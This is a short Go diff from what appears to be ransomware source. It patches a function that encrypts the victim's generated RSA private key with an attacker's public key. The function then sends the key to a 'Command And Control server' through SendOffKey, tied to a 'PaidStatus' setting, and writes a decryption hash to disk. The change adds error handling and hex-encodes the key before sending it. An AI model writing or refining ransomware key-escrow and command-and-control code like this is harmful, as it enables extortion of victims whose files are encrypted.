@@ -142,12 +142,15 @@ func encryptClientPrivateKeyWithServerPublicKey(clientPrivateKey []byte, publicK
 
 func handleClientKey(pubKeyBytes []byte, clientPrivateKey *rsa.PrivateKey, flag *bool) (string, error) {
 	encryptedClientPrivateKey, err := encryptClientPrivateKeyWithServerPublicKey(x509.MarshalPKCS1PrivateKey(clientPrivateKey), pubKeyBytes)
+	if err != nil {
+		return "", errors.New("Failed to encrypt client private key")
+	}
 	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
 	if cli.Settings.RawKey {
 		ioutil.WriteFile("./raw_key.bin", x509.MarshalPKCS1PrivateKey(clientPrivateKey), 0777)
 	} else {
 		var resp bool
-		resp, err = utils.SendOffKey(string(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
+		resp, err = utils.SendOffKey(hex.EncodeToString(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
 		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(privateKeyBytes)), 0777)
 		if err != nil || !resp {
 			log.Println("Failed to contact Command And Control server")
